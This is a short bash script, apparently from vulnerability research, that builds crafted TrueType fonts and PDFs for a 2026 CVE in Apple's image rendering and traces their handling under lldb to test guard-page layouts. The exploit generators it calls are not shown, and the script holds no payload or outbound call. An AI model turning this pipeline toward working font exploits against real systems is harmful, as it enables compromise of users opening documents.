#!/bin/bash
# RIP-12: guard-page proof (5 guard configurations across 3 survivor Ls)
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render4 render4.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYB'
import sys; sys.path.insert(0, '.')
from gen_k2 import build_font
for L in (28928, 31344, 31472):
    build_font(f"k2_d{L}.ttf", L)
print("fonts built")
PYB
for L in 28928 31344 31472; do ./venv/bin/python gen_pdf.py k2_d${L}.pdf k2_d${L}.ttf; done
rm -f rip12_trace.txt
lldb -b ./render4 -o "command script import $PWD/../cg-extract/rip12.py" > rip12_session.txt 2>&1 || true
cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{rip12_trace.txt,rip12_session.txt} findings/ 2>/dev/null
ls findings/ | wc -l
cat detonation/cve-2026-86950/rip12_trace.txt | head -50
